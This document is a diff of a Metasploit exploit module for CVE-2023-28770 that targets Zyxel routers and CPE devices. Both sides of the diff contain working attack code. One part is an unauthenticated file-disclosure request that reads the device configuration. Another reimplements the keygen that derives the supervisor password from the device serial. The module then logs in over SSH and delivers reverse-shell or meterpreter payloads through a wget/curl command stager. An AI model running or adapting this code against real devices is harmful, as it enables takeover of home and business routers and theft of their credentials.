@@ -1,10 +1,6 @@
 ##
-# Metasploit Module — saved locally via SuiteXPL MSF Bridge
-# Source: https://github.com/rapid7/metasploit-framework
-# CVE: CVE-2023-28770
-# Affects: Zyxel VMG series routers and 40+ CPE devices with zhttpd/zcmd
-# Chain: LFI (config disclosure) -> serial-derived supervisor password -> SSH RCE
-# Bridge: embedxpl.core.bridges.exploit_bridge.run_via_msfconsole("zyxel_lfi_unauth_ssh_rce")
+# This module requires Metasploit: https://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
 ##
 
 require 'socket'
@@ -12,6 +8,7 @@ require 'digest/md5'
 
 class MetasploitModule < Msf::Exploit::Remote
   Rank = ExcellentRanking
+
   include Msf::Exploit::Remote::HttpClient
   include Msf::Exploit::Remote::SSH
   include Msf::Exploit::CmdStager
@@ -20,131 +17,482 @@ class MetasploitModule < Msf::Exploit::Remote
   attr_accessor :ssh_socket
 
   def initialize(info = {})
-    super(update_info(info,
-      'Name' => 'Zyxel Chained RCE: LFI + Weak Password Derivation via SSH (CVE-2023-28770)',
-      'Description' => %q{
-        Chain for 40+ Zyxel routers/CPE devices:
-        1. LFI via /Export_Log?/data/zcfg_config.json (unauthenticated, reads full config)
-        2. Derives supervisor password from device serial using MD5-based algorithm
-        3. SSH login as supervisor for RCE
-        Executes commands as user supervisor.
-      },
-      'License' => MSF_LICENSE,
-      'Author' => ['h00die-gr3y', 'SEC Consult Vulnerability Lab', 'Thomas Rinsma', 'Bogi Napoleon Wennerstrøm'],
-      'References' => [
-        ['CVE', '2023-28770'],
-        ['URL', 'https://r.sec-consult.com/zyxsploit'],
-        ['URL', 'https://sec-consult.com/vulnerability-lab/advisory/multiple-critical-vulnerabilities-in-multiple-zyxel-devices/'],
-        ['URL', 'https://github.com/boginw/zyxel-vmg8825-keygen'],
-      ],
-      'DisclosureDate' => '2022-02-01',
-      'Privileged' => true,
-      'Targets' => [
-        ['Unix Command', {'Platform' => 'unix', 'Arch' => ARCH_CMD, 'Type' => :unix_cmd, 'DefaultOptions' => {'PAYLOAD' => 'cmd/unix/reverse_netcat'}}],
-        ['Linux Dropper (MIPS)', {'Platform' => 'linux', 'Arch' => [ARCH_MIPSBE], 'Type' => :linux_dropper,
-          'CmdStagerFlavor' => ['printf', 'echo', 'bourne', 'wget', 'curl'],
-          'DefaultOptions' => {'PAYLOAD' => 'linux/mipsbe/meterpreter/reverse_tcp'}}],
-        ['Interactive SSH', {'DefaultOptions' => {'PAYLOAD' => 'generic/ssh/interact'}, 'Payload' => {'Compat' => {'PayloadType' => 'ssh_interact'}}}]
-      ],
-      'DefaultTarget' => 0,
-      'DefaultOptions' => {'RPORT' => 80, 'SSL' => false, 'SSH_TIMEOUT' => 30, 'WfsDelay' => 5},
-      'Notes' => {'Stability' => [CRASH_SAFE], 'Reliability' => [REPEATABLE_SESSION], 'SideEffects' => [IOC_IN_LOGS, ARTIFACTS_ON_DISK]}
-    ))
-    register_options([OptBool.new('STORE_CRED', [false, 'Store credentials in DB', true])])
-    register_advanced_options([OptInt.new('ConnectTimeout', [true, 'TCP connect timeout', 10])])
+    super(
+      update_info(
+        info,
+        'Name' => 'Zyxel chained RCE using LFI and weak password derivation algorithm',
+        'Description' => %q{
+          This module exploits multiple vulnerabilities in the `zhttpd` binary (/bin/zhttpd)
+          and `zcmd` binary (/bin/zcmd). It is present on more than 40 Zyxel routers and CPE devices.
+          The remote code execution vulnerability can be exploited by chaining the local file disclosure
+          vulnerability in the zhttpd binary that allows an unauthenticated attacker to read the entire configuration
+          of the router via the vulnerable endpoint `/Export_Log?/data/zcfg_config.json`.
+          With this information disclosure, the attacker can determine if the router is reachable via ssh
+          and use the second vulnerability in the `zcmd` binary to derive the `supervisor` password exploiting
+          a weak implementation of a password derivation algorithm using the device serial number.
+
+          After exploitation, an attacker will be able to execute any command as user `supervisor`.
+        },
+        'License' => MSF_LICENSE,
+        'Author' => [
+          'h00die-gr3y <h00die.gr3y[at]gmail.com>', # Author of exploit chain and MSF module contributor
+          'SEC Consult Vulnerability Lab',
+          'Thomas Rinsma',
+          'Bogi Napoleon Wennerstrøm'
+        ],
+        'References' => [
+          ['CVE', '2023-28770'],
+          ['URL', 'https://r.sec-consult.com/zyxsploit'],
+          ['URL', 'https://sec-consult.com/vulnerability-lab/advisory/multiple-critical-vulnerabilities-in-multiple-zyxel-devices/'],
+          ['URL', 'https://th0mas.nl/2020/03/26/getting-root-on-a-zyxel-vmg8825-t50-router/'],
+          ['URL', 'https://github.com/boginw/zyxel-vmg8825-keygen'],
+          ['URL', 'https://attackerkb.com/topics/tPAvkwQgDK/cve-2023-28770']
+        ],
+        'DisclosureDate' => '2022-02-01',
+        'Privileged' => true,
+        'Targets' => [
+          [
+            'Unix Command',
+            {
+              'Platform' => 'unix',
+              'Arch' => ARCH_CMD,
+              'Type' => :unix_cmd,
+              'DefaultOptions' => {
+                'PAYLOAD' => 'cmd/unix/reverse_netcat'
+              }
+            }
+          ],
+          [
+            'Linux Dropper',
+            {
+              'Platform' => 'linux',
+              'Arch' => [ARCH_MIPSBE],
+              'Type' => :linux_dropper,
+              'CmdStagerFlavor' => ['printf', 'echo', 'bourne', 'wget', 'curl'],
+              'DefaultOptions' => {
+                'PAYLOAD' => 'linux/mipsbe/meterpreter/reverse_tcp'
+              }
+            }
+          ],
+          [
+            'Interactive SSH',
+            {
+              'DefaultOptions' => {
+                'PAYLOAD' => 'generic/ssh/interact'
+              },
+              'Payload' => {
+                'Compat' => {
+                  'PayloadType' => 'ssh_interact'
+                }
+              }
+            }
+          ]
+        ],
+        'DefaultTarget' => 0,
+        'DefaultOptions' => {
+          'RPORT' => 80,
+          'SSL' => false,
+          'SSH_TIMEOUT' => 30,
+          'WfsDelay' => 5
+        },
+        'Notes' => {
+          'Stability' => [CRASH_SAFE],
+          'Reliability' => [REPEATABLE_SESSION],
+          'SideEffects' => [IOC_IN_LOGS, ARTIFACTS_ON_DISK]
+        }
+      )
+    )
+    register_options(
+      [
+        OptBool.new('STORE_CRED', [false, 'Store credentials into the database.', true])
+      ]
+    )
+    register_advanced_options(
+      [
+        OptInt.new('ConnectTimeout', [ true, 'Maximum number of seconds to establish a TCP connection', 10])
+      ]
+    )
   end
 
-  # MD5-based double hash password derivation (SerialNumMethod2 and Method3)
+  # supervisor user password derivation functions (SerialNumMethod2 and 3) for Zyxel routers
+  # based on the reverse engineer analysis of Thomas Rinsma and Bogi Napoleon Wennerstrøm
+  # https://github.com/boginw/zyxel-vmg8825-keygen
+
   def double_hash(input, size = 8)
-    md5_arr = Digest::MD5.hexdigest(input).split(//)
-    r1 = Array.new(32)
+    # ROUND 1
+    # take the MD5 hash from the serial number SXXXXXXXXXXXX
+    # this returns a hash of 32 char bytes.
+    # read md5 hash per two char bytes, check if first char byte = '0', then make first byte char == second byte char
+    # store two char bytes in round1 and continue with next two char bytes from the hash.
+    md5_str_array = Digest::MD5.hexdigest(input).split(//)
+    round1_str_array = Array.new(32)
     j = 0
     until j == 32
-      r1[j] = md5_arr[j] == '0' ? md5_arr[j+1] : md5_arr[j]
-      r1[j+1] = md5_arr[j+1]; j += 2
+      if md5_str_array[j] == '0'
+        round1_str_array[j] = md5_str_array[j + 1]
+      else
+        round1_str_array[j] = md5_str_array[j]
+      end
+      round1_str_array[j + 1] = md5_str_array[j + 1]
+      j += 2
     end
-    md5_arr2 = Digest::MD5.hexdigest(r1.join).split(//)
-    r2 = Array.new(32)
+    round1 = round1_str_array.join
+    # ROUND 2
+    # take the MD5 hash from the result of round1
+    # returns a hash of 32 char bytes.
+    # read md5 hash per two char bytes, check if first char byte = '0', then make first byte char == second byte char
+    # store two char bytes in round2 and continue with next two char bytes.
+    md5_str_array = Digest::MD5.hexdigest(round1).split(//)
+    round2_str_array = Array.new(32)
     j = 0
     until j == 32
-      r2[j] = md5_arr2[j] == '0' ? md5_arr2[j+1] : md5_arr2[j]
-      r2[j+1] = md5_arr2[j+1]; j += 2
+      if md5_str_array[j] == '0'
+        round2_str_array[j] = md5_str_array[j + 1]
+      else
+        round2_str_array[j] = md5_str_array[j]
+      end
+      round2_str_array[j + 1] = md5_str_array[j + 1]
+      j += 2
     end
-    r3 = Array.new(size)
-    (0..(size-1)).each { |i| r3[i] = r2[i*3] }
-    r3.join
+    # ROUND 3
+    # take the result of round2 and pick the number (size) of char bytes starting with indice [0] and increased by 3
+    # to create the final password hash with defined number (size) of alphanumeric characters and return the final result
+    round3_str_array = Array.new(size)
+    for i in 0..(size - 1) do
+      round3_str_array[i] = round2_str_array[i * 3]
+    end
+    round3 = round3_str_array.join
+    return round3
   end
 
-  def serial_num_method2(serial); double_hash(serial); end
+  def mod3_key_generator(seed)
+    # key generator function used in the SerialNumMethod3 pasword derivation function
+    round4_array = Array.new(16, 0)
+    found0s = 0
+    found1s = 0
+    found2s = 0
+
+    while (found0s == 0) || (found1s == 0) || (found2s == 0)
+      found0s = 0
+      found1s = 0
+      found2s = 0
+
+      power_of_2 = 1
+      seed += 1
+
+      for i in 0..9 do
+        round4_array[i] = (seed % (power_of_2 * 3) / power_of_2).floor
+        if (round4_array[i] == 1)
+          found1s += 1
+        elsif (round4_array[i]) == 2
+          found2s += 1
+        else
+          found0s += 1
+        end
+        power_of_2 <<= 1
+      end
+    end
+    return seed, round4_array
+  end
+
+  def serial_num_method2(serial_number)
+    # SerialNumMethod2 password derivation function
+    pwd = double_hash(serial_number)
+    return pwd
+  end
+
+  def serial_num_method3(serial_number)
+    # SerialNumMethod3 password derivation function
+
+    # constant definitions
+    keystr1_byte_array = 'IO'.bytes.to_a
+    keystr2_byte_array = 'lo'.bytes.to_a
+    keystr3_byte_array = '10'.bytes.to_a
+    valstr_byte_array = '23456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnpqrstuvwxyz0123456789ABCDEF'.bytes.to_a
+    offset1 = 0x8
+    offset2 = 0x20
+
+    round3 = double_hash(serial_number, 10)
+    round3.upcase!
+    round3_byte_array = round3.bytes.to_a
+
+    md5_str = Digest::MD5.hexdigest(serial_number)
+    md5_str_array = md5_str.split(//)
+    offset = md5_str_array[2] + md5_str_array[3] + md5_str_array[4] + md5_str_array[5]
+
+    result = mod3_key_generator(offset.to_i(16))
+    offset = result[0]
+    round4 = result[1]
+
+    for i in 0..9 do
+      if round4[i] == 1
+        new_val = (((round3_byte_array[i] % 0x1a) * 0x1000000) >> 0x18) + 'A'.bytes.join.to_i
+        round3_byte_array[i] = new_val
+        for j in 0..1 do
+          next unless (round3_byte_array[i] == keystr1_byte_array[j])
+
+          index = offset1 + ((offset + j) % 0x18)
+          round3_byte_array[i] = valstr_byte_array[index]
+          break
+        end
+      elsif round4[i] == 2
+        new_val = (((round3_byte_array[i] % 0x1a) * 0x1000000) >> 0x18) + 'a'.bytes.join.to_i
+        round3_byte_array[i] = new_val
+        for j in 0..1 do
+          next unless (round3_byte_array[i] == keystr2_byte_array[j])
+
+          index = offset2 + ((offset + j) % 0x18)
+          round3_byte_array[i] = valstr_byte_array[index]
+          break
+        end
+      else
+        new_val = (((round3_byte_array[i] % 10) * 0x1000000) >> 0x18) + '0'.bytes.join.to_i
+        round3_byte_array[i] = new_val
+        for j in 0..1 do
+          next unless (round3_byte_array[i] == keystr3_byte_array[j])
+
+          var = ((offset + j) >> 0x1f) >> 0x1d
+          index = ((offset + j + var) & 7) - var
+          round3_byte_array[i] = valstr_byte_array[index]
+          break
+        end
+      end
+    end
+    pwd = round3_byte_array.pack('C*')
+    return pwd
+  end
 
   def crack_supervisor_pwd(serial)
-    pwd2 = serial_num_method2(serial)
-    print_status("Derived supervisor password (Method2): #{pwd2}")
-    { 'method2' => pwd2 }
+    # crack supervisor password using the device serial number
+    # there are two confirmed hashing functions that can derive the supervisor password from the serial number:
+    # SerialNumMethod2 and SerialNumMethod3
+    # both passwords candidates will be returned as hashes
+
+    hash_pwd = { 'method2' => nil, 'method3' => nil }
+    # SerialNumMethod2
+    hash_pwd['method2'] = serial_num_method2(serial)
+    # SerialNumMethod3
+    hash_pwd['method3'] = serial_num_method3(serial)
+
+    print_status("Derived supervisor password using SerialNumMethod2: #{hash_pwd['method2']}")
+    print_status("Derived supervisor password using SerialNumMethod3: #{hash_pwd['method3']}")
+    return hash_pwd
+  end
+
+  def report_creds(user, pwd)
+    credential_data = {
+      module_fullname: fullname,
+      username: user,
+      private_data: pwd,
+      private_type: :password,
+      workspace_id: myworkspace_id,
+      status: Metasploit::Model::Login::Status::UNTRIED
+    }.merge(service_details)
+
+    cred_res = create_credential_and_login(credential_data)
+    unless cred_res.nil?
+      print_status("Credentials for user:#{user} are added to the database.")
+    end
   end
 
   def get_configuration
-    send_request_cgi('method' => 'GET', 'uri' => normalize_uri(target_uri.path, '/Export_Log?/data/zcfg_config.json'))
+    # Get the device configuration by exploiting the LFI vulnerability
+    return send_request_cgi({
+      'method' => 'GET',
+      'uri' => normalize_uri(target_uri.path, '/Export_Log?/data/zcfg_config.json')
+    })
   end
 
-  def check_port(port)
-    Timeout.timeout(datastore['ConnectTimeout']) { TCPSocket.new(datastore['RHOST'], port).close; true }
-  rescue; false
-  end
+  # Initiate the process configuration exception class used in the process_configuration function
+  class ProcessConfigException < StandardError
+    attr_reader :exception_type
 
-  def do_login(ip, user, pass, ssh_port)
-    opts = ssh_client_defaults.merge(auth_methods: ['password', 'keyboard-interactive'], port: ssh_port, password: pass)
-    begin
-      ::Timeout.timeout(datastore['SSH_TIMEOUT']) { self.ssh_socket = Net::SSH.start(ip, user, opts) }
-    rescue Rex::ConnectionError; fail_with(Failure::Unreachable, 'Connection error')
-    rescue Net::SSH::AuthenticationFailed; return false
-    rescue Net::SSH::Exception => e; fail_with(Failure::Unknown, "SSH: #{e.message}")
+    def initialize(msg = 'This is my custom process config exception', exception_type = 'custom')
+      @exception_type = exception_type
+      super(msg)
     end
-    fail_with(Failure::Unknown, 'No SSH socket') unless ssh_socket
-    true
+  end
+
+  def process_configuration(res)
+    # Initiate the instance variable config to store the configuration
+    @config = {}
+
+    # Parse the device configuration json file
+    res_json = res.get_json_document
+    if res_json.blank?
+      raise ProcessConfigException.new 'No device configuration file found.', 'ConfigUnknown'
+    end
+
+    # process json output and retrieve information about supervisor user, ssh port and ssh WAN service status
+    # Also grab hardware and software version including the serial number to crack the password of user supervisor
+    @config['hardware'] = res_json.dig('DeviceInfo', 'HardwareVersion')
+    @config['software'] = res_json.dig('DeviceInfo', 'SoftwareVersion')
+    @config['serial'] = res_json.dig('DeviceInfo', 'SerialNumber')
+
+    login_cfg = res_json.dig('X_ZYXEL_LoginCfg', 'LogGp')
+    unless login_cfg.nil?
+      @config['ssh_user'] = login_cfg.select { |l| l['Account']&.select { |a| a['Username'] == 'supervisor' } }.blank? ? nil : 'supervisor'
+    end
+
+    remote_service = res_json.dig('X_ZYXEL_RemoteManagement', 'Service')
+    unless remote_service.nil?
+      service = remote_service.select { |s| s['Name'] == 'SSH' }.first
+      if service&.fetch('Name', nil) == 'SSH'
+        @config['ssh_port'] = service['Port']
+        @config['ssh_wan_access'] = service['Mode']
+        @config['ssh_service_enabled'] = service['Enable']
+      end
+    end
+    print_status("Hardware:#{@config['hardware']} Firmware:#{@config['software']} Serial:#{@config['serial']}")
+
+    # check if all hash key/value pairs are populated and raise exceptions if retrieved config is not vulnerable
+    if @config['serial'].nil? || @config['ssh_user'].nil? || @config['ssh_port'].nil? || @config['ssh_wan_access'].nil? || @config['ssh_service_enabled'].nil?
+      raise ProcessConfigException.new 'Device serial, supervisor user, SSH port, or SSH WAN access/service status not found.', 'ConfigUnknown'
+    end
+
+    # check if ssh service is enabled
+    # if true then check ssh_port is open and ssh service is accessible from the WAN side
+    if @config['ssh_service_enabled']
+      if @config['ssh_wan_access'] == 'LAN_WAN' && check_port(@config['ssh_port'])
+        return
+      else
+        raise ProcessConfigException.new "WAN access to SSH service is NOT allowed or SSH port #{@config['ssh_port']} is closed. Try exploit from the LAN side.", 'ConfigUnreachable'
+      end
+    else
+      raise ProcessConfigException.new 'SSH service is NOT available.', 'ConfigNotVulnerable'
+    end
   end
 
   def execute_command(cmd, _opts = {})
     Timeout.timeout(datastore['WfsDelay']) { ssh_socket.exec!(cmd) }
-  rescue Timeout::Error; @timeout = true
+  rescue Timeout::Error
+    @timeout = true
+  end
+
+  def do_login(ip, user, pass, ssh_port)
+    # create SSH session and login
+    # if login is successfull, return true else return false. All other errors will trigger an immediate fail
+    opts = ssh_client_defaults.merge({
+      auth_methods: ['password', 'keyboard-interactive'],
+      port: ssh_port,
+      password: pass
+    })
+
+    opts.merge!(verbose: :debug) if datastore['SSH_DEBUG']
+
+    begin
+      ::Timeout.timeout(datastore['SSH_TIMEOUT']) do
+        self.ssh_socket = Net::SSH.start(ip, user, opts)
+      end
+    rescue Rex::ConnectionError
+      fail_with(Failure::Unreachable, 'Disconnected during negotiation')
+    rescue Net::SSH::Disconnect, ::EOFError
+      fail_with(Failure::Disconnected, 'Timed out during negotiation')
+    rescue Net::SSH::AuthenticationFailed
+      return false
+    rescue Net::SSH::Exception => e
+      fail_with(Failure::Unknown, "SSH Error: #{e.class} : #{e.message}")
+    end
+
+    fail_with(Failure::Unknown, 'Failed to start SSH socket') unless ssh_socket
+    return true
+  end
+
+  def check_port(port)
+    # checks network port and return true if open and false if closed.
+    Timeout.timeout(datastore['ConnectTimeout']) do
+      TCPSocket.new(datastore['RHOST'], port).close
+      return true
+    rescue StandardError
+      return false
+    end
+  rescue Timeout::Error
+    return false
   end
 
   def check
+    # Initiate the instance variable config to store the configuration
+    # @config = { 'hardware' => nil, 'software' => nil, 'serial' => nil, 'ssh_user' => nil, 'ssh_port' => nil, 'ssh_wan_access' => nil, 'ssh_service_enabled' => nil }
+
     res = get_configuration
-    return CheckCode::Unknown('No response') if res.nil?
-    return CheckCode::Unknown('Not 200') if res.code != 200
+    return CheckCode::Unknown('No response received from the target') if res.nil?
+    return CheckCode::Unknown('Could not retrieve the target configuration') if res.code != 200
+
     begin
-      cfg = res.get_json_document
-      return CheckCode::Unknown('No config JSON') if cfg.blank?
-      serial = cfg.dig('DeviceInfo', 'SerialNumber')
-      return CheckCode::Unknown('No serial') unless serial
-      CheckCode::Vulnerable("Serial: #{serial}")
-    rescue => e; CheckCode::Unknown(e.message)
+      process_configuration(res)
+    rescue ProcessConfigException => e
+      case e.exception_type
+      when 'ConfigNotVulnerable', 'ConfigUnreachable'
+        return CheckCode::Safe(e.message)
+      when 'ConfigUnknown'
+        return CheckCode::Unknown(e.message)
+      end
     end
+    return CheckCode::Vulnerable('The target is vulnerable')
   end
 
   def exploit
-    res = get_configuration
-    fail_with(Failure::NotVulnerable, 'LFI failed') if res.nil? || res.code != 200
-    cfg = res.get_json_document
-    @config = {
-      'serial' => cfg.dig('DeviceInfo', 'SerialNumber'),
-      'software' => cfg.dig('DeviceInfo', 'SoftwareVersion')
-    }
-    ssh_svc = cfg.dig('X_ZYXEL_RemoteManagement', 'Service')&.find { |s| s['Name'] == 'SSH' }
-    @config['ssh_port'] = ssh_svc&.fetch('Port', 22) || 22
-    print_status("Target: firmware=#{@config['software']} serial=#{@config['serial']} ssh_port=#{@config['ssh_port']}")
-    supervisor_pwd = crack_supervisor_pwd(@config['serial'])
-    unless do_login(datastore['RHOST'], 'supervisor', supervisor_pwd['method2'], @config['ssh_port'])
-      fail_with(Failure::NoAccess, 'All password derivation methods failed')
+    # run if AutoCheck is false (@config = nil), otherwise use the information in @config gathered during the check method
+    unless @config
+      res = get_configuration
+      fail_with(Failure::NotVulnerable, 'Target is not vulnerable.') if res.nil? || res.code != 200
+
+      begin
+        process_configuration(res)
+      rescue ProcessConfigException => e
+        case e.exception_type
+        when 'ConfigNotVulnerable'
+          return fail_with(Failure::NotVulnerable, e.message)
+        when 'ConfigUnreachable'
+          return fail_with(Failure::Unreachable, e.message)
+        when 'ConfigUnknown'
+          return fail_with(Failure::Unknown, e.message)
+        end
+      end
     end
-    print_good("Authenticated as supervisor with derived password!")
-    create_credential_and_login(module_fullname: fullname, username: 'supervisor', private_data: supervisor_pwd['method2'],
-      private_type: :password, workspace_id: myworkspace_id, status: Metasploit::Model::Login::Status::SUCCESSFUL) if datastore['STORE_CRED']
-    return handler(ssh_socket) if target.name == 'Interactive SSH'
+
+    # extra checks added to handle ForceExploit true setting
+    if @config['ssh_service_enabled']
+      if @config['ssh_wan_access'] == 'LAN_WAN' && check_port(@config['ssh_port'])
+        print_status("SSH service is available and SSH Port #{@config['ssh_port']} is open. Continue to login.")
+      else
+        fail_with(Failure::Unreachable, 'SSH service is not availabe and/or SSH port is closed.')
+      end
+    else
+      fail_with(Failure::BadConfig, 'SSH service and/or SSH port information is missing.')
+    end
+
+    # derive supervisor password candidates using password derivation method SerialNumMethod2 and SerialNumMethod3
+    if @config['serial'].nil?
+      fail_with(Failure::BadConfig, 'Serial device number is missing to crack the supervisor password.')
+    else
+      supervisor_pwd = crack_supervisor_pwd(@config['serial'])
+    end
+
+    # try supervisor password derived by SerialNumMethod3 first, if it fails then try the password derived by SerialNumMethod2
+    if do_login(datastore['RHOST'], @config['ssh_user'], supervisor_pwd['method3'], @config['ssh_port'])
+      print_status('Authentication with derived supervisor password using Method3 is successful.')
+      report_creds(@config['ssh_user'], supervisor_pwd['method3']) if datastore['STORE_CRED']
+    elsif do_login(datastore['RHOST'], @config['ssh_user'], supervisor_pwd['method2'], @config['ssh_port'])
+      print_status('Authentication with derived supervisor password using Method2 is successful.')
+      report_creds(@config['ssh_user'], supervisor_pwd['method2']) if datastore['STORE_CRED']
+    else
+      fail_with(Failure::NoAccess, 'Both supervisor password derivation methods failed to authenticate.')
+    end
+
+    if target.name == 'Interactive SSH'
+      handler(ssh_socket)
+      return
+    end
+
+    print_status("Executing #{target.name} for #{datastore['PAYLOAD']}")
     case target['Type']
-    when :unix_cmd; execute_command(payload.encoded)
-    when :linux_dropper; execute_cmdstager(linemax: 500)
+    when :unix_cmd
+      execute_command(payload.encoded)
+    when :linux_dropper
+      # Don't check the response here since the server won't respond
+      # if the payload is successfully executed.
+      execute_cmdstager(linemax: 500)
     end
     @timeout ? ssh_socket.shutdown! : ssh_socket.close
   end
